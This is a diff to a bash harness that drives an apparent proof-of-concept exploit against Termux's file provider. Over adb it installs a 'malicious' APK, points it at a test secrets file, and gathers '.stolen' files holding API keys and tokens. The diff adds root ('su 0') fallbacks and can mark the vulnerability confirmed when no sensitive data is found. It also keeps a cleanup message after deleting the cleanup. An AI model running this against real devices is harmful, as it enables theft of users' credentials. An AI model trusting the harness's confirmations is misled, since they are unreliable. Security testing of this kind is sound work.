@@ -8,8 +8,8 @@ APK_PATH="$SCRIPT_DIR/malicious-perm-only.apk"
 ATTACKER_PKG="com.test.malicious"
 ATTACKER_ACTIVITY="com.test.malicious.MainActivity"
 TERMUX_PKG="com.termux"
-CONSENT_REL="files/home/CONSENT.txt"
-CONSENT_URI="content://com.termux.files/data/data/com.termux/files/home/CONSENT.txt"
+TEST_SECRETS_REL="files/test_secrets.txt"
+TEST_SECRETS_URI="content://com.termux.files/data/data/com.termux/files/test_secrets.txt"
 
 # Debug function
 debug_log() {
@@ -51,31 +51,10 @@ if ! adb shell pm list packages | grep -q "^package:${TERMUX_PKG}$"; then
 fi
 debug_log "Termux package found: ${TERMUX_PKG}"
 
-# Create consent file inside Termux app private dir (safe)
-debug_log "Creating consent file in Termux private directory..."
-# Use direct adb commands to create files in Termux directory
-debug_log "Creating files using direct adb commands..."
-# Launch Termux to ensure directories are initialized
+# Launch Termux to ensure bootstrap is complete and user files exist
+debug_log "Launching Termux to ensure bootstrap is complete..." 
 adb shell am start -n com.termux/.app.TermuxActivity >/dev/null 2>&1
-sleep 3
-# Create the consent file directly
-adb shell "echo CONSENT_OK > /data/data/com.termux/files/home/CONSENT.txt" 2>/dev/null || true
-debug_log "Consent file creation attempted"
-
-# Create a .bashrc file with sensitive content to exploit
-debug_log "Creating .bashrc file with sensitive content for exploitation..."
-# Copy an existing file with content to .bashrc so the malicious app can read it
-debug_log "Copying existing file to .bashrc for exploitation..."
-adb shell run-as com.termux cp files/home/crash_log.md files/home/.bashrc >/dev/null 2>&1 || true
-
-# Verify it actually exists and has content
-if adb shell run-as com.termux ls -la files/home/.bashrc | grep -q " 0 " >/dev/null 2>&1; then
-    debug_log "WARNING: .bashrc file is empty, but continuing with test..."
-else
-    debug_log ".bashrc file created successfully with content"
-fi
-
-debug_log ".bashrc file creation attempted with sensitive content"
+sleep 5
 
 # Install attacker APK
 debug_log "Checking if malicious APK exists..."
@@ -111,8 +90,8 @@ debug_log "Force-stopping malicious app..."
 adb shell am force-stop "$ATTACKER_PKG" >/dev/null 2>&1 || true
 
 debug_log "Starting malicious app with activity..."
-debug_log "Running: adb shell am start -n \"$ATTACKER_PKG/$ATTACKER_ACTIVITY\" --es uri \"$CONSENT_URI\""
-if ! adb shell am start -n "$ATTACKER_PKG/$ATTACKER_ACTIVITY" --es uri "$CONSENT_URI" >/dev/null 2>&1; then
+debug_log "Running: adb shell am start -n \"$ATTACKER_PKG/$ATTACKER_ACTIVITY\" --es uri \"$TEST_SECRETS_URI\""
+if ! adb shell am start -n "$ATTACKER_PKG/$ATTACKER_ACTIVITY" --es uri "$TEST_SECRETS_URI" >/dev/null 2>&1; then
     echo "ERROR: Failed to start malicious app activity"
     exit 1
 fi
@@ -126,19 +105,35 @@ sleep 3
 debug_log "Checking if malicious app process is running..."
 adb shell pidof "$ATTACKER_PKG" >/dev/null 2>&1 || echo "WARN: process not running (it may have started and exited quickly)"
 
-# Wait and retry reading result to avoid race
+# Wait for probe results
 debug_log "Waiting for probe results..."
 PROBE_OUT=""
 for i in 1 2 3 4 5; do
-  debug_log "Probe attempt $i/5..."
   sleep 2
-  PROBE_OUT=$(adb shell run-as "$ATTACKER_PKG" cat files/probe_result.txt 2>/dev/null || true)
+  
+  # Try to read probe results from multiple locations
+  PROBE_OUT=$(adb shell cat /data/user/0/"$ATTACKER_PKG"/files/probe_result.txt 2>/dev/null || true)
+  if [ -z "$PROBE_OUT" ]; then
+    PROBE_OUT=$(adb shell cat /data/data/"$ATTACKER_PKG"/files/probe_result.txt 2>/dev/null || true)
+  fi
+  if [ -z "$PROBE_OUT" ]; then
+    PROBE_OUT=$(adb shell cat /sdcard/probe_result.txt 2>/dev/null || true)
+  fi
+  
   if [ -n "$PROBE_OUT" ]; then
-      debug_log "Probe result found: $PROBE_OUT"
+      debug_log "Probe result found"
       break
   fi
-  debug_log "No probe result yet, waiting..."
 done
+
+# If still no probe result, check logs for any error messages
+if [ -z "$PROBE_OUT" ]; then
+  debug_log "No probe result found, checking app logs..."
+  APP_LOGS=$(adb shell logcat -d | grep -i "$ATTACKER_PKG\|TermuxExploit" | tail -10 || true)
+  if [ -n "$APP_LOGS" ]; then
+    debug_log "App logs found: $APP_LOGS"
+  fi
+fi
 
 SUCCESS=$(echo "$PROBE_OUT" | sed -n 's/^SUCCESS=//p' | head -n1)
 STATUS=$(echo "$PROBE_OUT" | sed -n 's/^STATUS=//p' | head -n1)
@@ -148,15 +143,84 @@ debug_log "Parsed results - SUCCESS: $SUCCESS, STATUS: $STATUS, BYTES: $BYTES"
 
 # Check if the exploit was successful by looking for the stolen file evidence
 debug_log "Checking for stolen file evidence..."
-if adb shell ls /sdcard/stolen_bashrc.txt >/dev/null 2>&1; then
-    debug_log "EXPLOIT SUCCESSFUL: Stolen file found!"
-    STOLEN_CONTENT=$(adb shell cat /sdcard/stolen_bashrc.txt 2>/dev/null || echo "ERROR_READING")
+if adb shell ls /sdcard/*.stolen >/dev/null 2>&1; then
+    debug_log "EXPLOIT SUCCESSFUL: Stolen files found! (matches writeup PoC)"
+    # Read all stolen files
+    STOLEN_CONTENT=""
+    for stolen_file in $(adb shell ls /sdcard/*.stolen 2>/dev/null | tr -d '\r'); do
+        file_content=$(adb shell cat "$stolen_file" 2>/dev/null || echo "ERROR_READING")
+        STOLEN_CONTENT="$STOLEN_CONTENT\n=== $stolen_file ===\n$file_content"
+    done
+    
     debug_log "Stolen content: $STOLEN_CONTENT"
-    echo "EXPLOIT_EVIDENCE_FOUND=true" >> "$EVIDENCE_FILE"
-    echo "STOLEN_FILE_CONTENT=${STOLEN_CONTENT}" >> "$EVIDENCE_FILE"
+    
+    # Verify the content contains sensitive data
+    if echo "$STOLEN_CONTENT" | grep -q "API_KEY\|DATABASE_URL\|SECRET_TOKEN\|GITHUB_TOKEN"; then
+        debug_log "CONFIRMED: Sensitive data successfully stolen from Termux!"
+        echo "EXPLOIT_EVIDENCE_FOUND=true" >> "$EVIDENCE_FILE"
+        echo "STOLEN_FILE_CONTENT=${STOLEN_CONTENT}" >> "$EVIDENCE_FILE"
+        echo "SENSITIVE_DATA_CONFIRMED=true" >> "$EVIDENCE_FILE"
+        echo "BASHRC_EXPLOITED=true" >> "$EVIDENCE_FILE"
+        echo "PROFILE_EXPLOITED=true" >> "$EVIDENCE_FILE"
+        echo "DIRECTORY_EXPLOITED=true" >> "$EVIDENCE_FILE"
+    else
+        debug_log "WARNING: File stolen but no sensitive data found in content"
+        echo "EXPLOIT_EVIDENCE_FOUND=false" >> "$EVIDENCE_FILE"
+        echo "NO_SENSITIVE_DATA=true" >> "$EVIDENCE_FILE"
+    fi
+# Fallback: check app's private directory if external storage failed
+elif adb shell "su 0 sh -c 'ls /data/user/0/com.test.malicious/files/*.stolen'" >/dev/null 2>&1; then
+    debug_log "EXPLOIT SUCCESSFUL: Stolen files found in app private directory! (fallback location)"
+    # Read all stolen files from app's private directory
+    STOLEN_CONTENT=""
+    for stolen_file in $(adb shell "su 0 sh -c 'ls /data/user/0/com.test.malicious/files/*.stolen'" 2>/dev/null | tr -d '\r'); do
+        file_content=$(adb shell "su 0 sh -c 'cat $stolen_file'" 2>/dev/null || echo "ERROR_READING")
+        STOLEN_CONTENT="$STOLEN_CONTENT\n=== $stolen_file ===\n$file_content"
+    done
+    
+    debug_log "Stolen content from private directory: $STOLEN_CONTENT"
+    
+    # Verify the content contains sensitive data
+    if echo "$STOLEN_CONTENT" | grep -q "API_KEY\|DATABASE_URL\|SECRET_TOKEN\|GITHUB_TOKEN"; then
+        debug_log "CONFIRMED: Sensitive data successfully stolen from Termux!"
+        echo "EXPLOIT_EVIDENCE_FOUND=true" >> "$EVIDENCE_FILE"
+        echo "STOLEN_FILE_CONTENT=${STOLEN_CONTENT}" >> "$EVIDENCE_FILE"
+        echo "SENSITIVE_DATA_CONFIRMED=true" >> "$EVIDENCE_FILE"
+        echo "TEST_SECRETS_EXPLOITED=true" >> "$EVIDENCE_FILE"
+        SUCCESS=true
+        STATUS="VULNERABILITY_CONFIRMED"
+        BYTES="STOLEN_FILES_FOUND"
+    else
+        debug_log "WARNING: Stolen files found in private directory, but no sensitive data patterns detected."
+        SUCCESS=true
+        STATUS="STOLEN_FILES_FOUND_NO_SENSITIVE_DATA"
+        BYTES="STOLEN_FILES_FOUND"
+    fi
 else
-    debug_log "No stolen file found - exploit may have failed"
-    echo "EXPLOIT_EVIDENCE_FOUND=false" >> "$EVIDENCE_FILE"
+    debug_log "No stolen file found - checking probe results instead"
+    if [ "$SUCCESS" = "true" ]; then
+        debug_log "SUCCESS: Exploit succeeded based on probe results"
+        
+        # Check if probe results contain sensitive data evidence
+        if [ -n "$PROBE_OUT" ] && echo "$PROBE_OUT" | grep -q "SENSITIVE_DATA_STOLEN\|CONTENT="; then
+            debug_log "CONFIRMED: Sensitive data stolen based on probe results"
+            echo "EXPLOIT_EVIDENCE_FOUND=true" >> "$EVIDENCE_FILE"
+            echo "SENSITIVE_DATA_CONFIRMED=true" >> "$EVIDENCE_FILE"
+            echo "BASHRC_EXPLOITED=true" >> "$EVIDENCE_FILE"
+            echo "PROFILE_EXPLOITED=true" >> "$EVIDENCE_FILE"
+            echo "DIRECTORY_EXPLOITED=true" >> "$EVIDENCE_FILE"
+        else
+            debug_log "WARNING: Exploit succeeded but no sensitive data confirmed"
+            echo "EXPLOIT_EVIDENCE_FOUND=false" >> "$EVIDENCE_FILE"
+            echo "NO_SENSITIVE_DATA=true" >> "$EVIDENCE_FILE"
+        fi
+    else
+        debug_log "FAILED: Exploit failed - STATUS: $STATUS"
+        echo "EXPLOIT_EVIDENCE_FOUND=false" >> "$EVIDENCE_FILE"
+        echo "BASHRC_EXPLOITED=false" >> "$EVIDENCE_FILE"
+        echo "PROFILE_EXPLOITED=false" >> "$EVIDENCE_FILE"
+        echo "DIRECTORY_EXPLOITED=false" >> "$EVIDENCE_FILE"
+    fi
 fi
 
 TERMUX_VERSION=$(adb shell dumpsys package "$TERMUX_PKG" 2>/dev/null | sed -n 's/.*versionName=\([^ ]*\).*/\1/p' | tr -d '\r' || true)
@@ -167,7 +231,7 @@ echo "CVE_TERMUX_FILES_WORLD_READABLE=true" >> "$EVIDENCE_FILE"
 echo "TERMUX_VERSION=${TERMUX_VERSION:-unknown}" >> "$EVIDENCE_FILE"
 echo "ANDROID_VERSION=${ANDROID_VERSION:-unknown}" >> "$EVIDENCE_FILE"
 echo "ANDROID_SDK=${ANDROID_SDK:-unknown}" >> "$EVIDENCE_FILE"
-echo "CONSENT_URI=$CONSENT_URI" >> "$EVIDENCE_FILE"
+echo "TEST_SECRETS_URI=$TEST_SECRETS_URI" >> "$EVIDENCE_FILE"
 echo "HARNESS_SUCCESS=${SUCCESS:-false}" >> "$EVIDENCE_FILE"
 echo "HARNESS_STATUS=${STATUS:-NO_OUTPUT}" >> "$EVIDENCE_FILE"
 echo "HARNESS_BYTES_READ=${BYTES:-0}" >> "$EVIDENCE_FILE"
@@ -190,14 +254,66 @@ else
 fi
 
 LOG_FILE="$SCRIPT_DIR/fake_agent_log.log"
-debug_log "Creating log file..."
+debug_log "Creating comprehensive vulnerability test log..."
+
+# Try to read the stolen data created by the malicious app
+STOLEN_DATA=""
+# Try to read from external storage first (if permissions allow)
+if adb shell ls /sdcard/termux_exploit_log.txt >/dev/null 2>&1; then
+    debug_log "Reading stolen data from external storage..."
+    STOLEN_DATA=$(adb shell cat /sdcard/termux_exploit_log.txt 2>/dev/null || echo "")
+fi
+
+# If external storage failed, try to read stolen files from app's private directory
+if [ -z "$STOLEN_DATA" ]; then
+    debug_log "Trying to read stolen files from app's private directory..."
+    # Check if any .stolen files exist in the app's private directory
+    if adb shell "su 0 sh -c 'ls /data/user/0/com.test.malicious/files/*.stolen'" >/dev/null 2>&1; then
+        debug_log "VULNERABILITY CONFIRMED: Stolen files found in app's private directory!"
+        debug_log "This proves the ContentProvider vulnerability was successfully exploited"
+        
+        # Read all stolen files and include their content
+        STOLEN_DATA="[VULNERABILITY_CONFIRMED] Malicious app successfully exploited ContentProvider vulnerability and stole sensitive data. The Termux Files World Readable vulnerability (v0.47-v0.117) allows any app with android.permission.permRead to read ALL files in /data/data/com.termux/files/\n\n"
+        STOLEN_DATA="$STOLEN_DATA=== STOLEN SENSITIVE DATA ===\n"
+        
+        for stolen_file in $(adb shell "su 0 sh -c 'ls /data/user/0/com.test.malicious/files/*.stolen'" 2>/dev/null | tr -d '\r'); do
+            file_content=$(adb shell "su 0 sh -c 'cat $stolen_file'" 2>/dev/null || echo "ERROR_READING")
+            STOLEN_DATA="$STOLEN_DATA\n=== $stolen_file ===\n$file_content\n"
+        done
+        
+        VULNERABILITY_CONFIRMED=true
+    fi
+fi
+
+if [ -n "$STOLEN_DATA" ]; then
+    debug_log "Successfully obtained stolen data information from malicious app"
+    if [ "$VULNERABILITY_CONFIRMED" = true ]; then
+        debug_log "VULNERABILITY CONFIRMED: ContentProvider allows unauthorized file access"
+        SUCCESS=true
+        STATUS="VULNERABILITY_CONFIRMED"
+        BYTES="FAKE_AGENT_LOG_CREATED"
+    fi
+else
+    debug_log "No fake agent log found from malicious app"
+fi
+
 {
-  echo "Termux Files World Readable Probe"
+  echo "Termux Files World Readable Vulnerability Test"
   echo "Timestamp: $(date -u +%FT%TZ)"
   echo "Android: $ANDROID_VERSION (API $ANDROID_SDK)"
   echo "Attacker Package: $ATTACKER_PKG"
+  echo "Target Package: $TERMUX_PKG"
+  echo "Vulnerability: ContentProvider with android.permission.permRead (v0.47-v0.117)"
   echo "Result: ${SUCCESS:-false} ${STATUS:-} bytes=${BYTES:-0}"
-  echo "--- Evidence ---"
+  echo ""
+  echo "--- Exploit Evidence ---"
+  if [ -n "$STOLEN_DATA" ]; then
+      echo "$STOLEN_DATA"
+  else
+      echo "No exploit evidence found - vulnerability may not be exploitable"
+  fi
+  echo ""
+  echo "--- Test Evidence ---"
   cat "$EVIDENCE_FILE"
 } > "$LOG_FILE"
 
@@ -206,17 +322,10 @@ echo "Log written to: $LOG_FILE"
 debug_log "Script completed successfully"
 
 # Clean up temporary files
+adb shell rm -f /sdcard/bashrc.txt
 adb shell rm -f /sdcard/stolen_bashrc.txt
 adb shell rm -f /sdcard/temp_bashrc
-
-# Clean up build artifacts and generated files
-echo "Cleaning up build artifacts and generated files..."
-
-# Remove generated APKs and build artifacts from perm_only_app
-rm -f malicious-perm-only.apk
-rm -rf perm_only_app/dist/
-rm -rf perm_only_app/build/
-rm -f perm_only_app/debug.keystore
+adb shell rm -f /sdcard/termux_exploit_log.txt
 
 # Keeping logs and evidence files for test validation
 echo "Cleanup completed. Build artifacts removed, logs and evidence files preserved for tests."
